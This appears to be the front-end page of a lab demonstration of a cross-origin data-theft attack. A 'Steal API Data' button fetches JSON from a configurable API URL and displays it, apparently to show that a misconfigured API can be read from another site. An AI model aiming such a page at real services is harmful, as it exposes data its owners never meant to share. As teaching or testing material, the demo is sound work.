<!-- attacker-app/index.html -->
<!DOCTYPE html>
<html>
<head><title>Attacker Frontend</title></head>
<body>
  <h1>Attacker Frontend</h1>
  <button onclick="stealData()">Steal API Data</button>
  <pre id="result"></pre>
  
  <script src="/env.js"></script>
  
  <script>
    async function stealData() {
      try {
        const res = await fetch(window.API_URL + '/data');
        const data = await res.json();
        document.getElementById('result').textContent = JSON.stringify(data);
      } catch (e) {
        document.getElementById('result').textContent = 'Error: ' + e.message;
      }
    }
  </script>
</body>
</html>
